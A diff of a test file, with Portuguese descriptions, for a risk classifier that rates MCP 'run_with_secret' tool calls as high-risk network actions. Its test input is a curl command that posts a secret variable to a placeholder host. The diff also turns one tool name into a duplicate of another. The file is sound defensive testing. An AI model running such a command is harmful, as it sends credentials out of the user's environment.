@@ -168,7 +168,7 @@ describe("risco", () => {
   test("run_with_secret, de qualquer servidor MCP, é high e rede: comando livre com segredo nunca passa como rotina", () => {
     for (const tool of [
       "mcp__flightdeck__run_with_secret",
-      "mcp__flightdeck-actions__run_with_secret",
+      "mcp__flightdeck__run_with_secret",
       "mcp__outro__run_with_secret",
     ]) {
       expect(risk.classify(tool, { command: "curl -d $T x", secrets: ["t"] }, CWD)).toMatchObject({
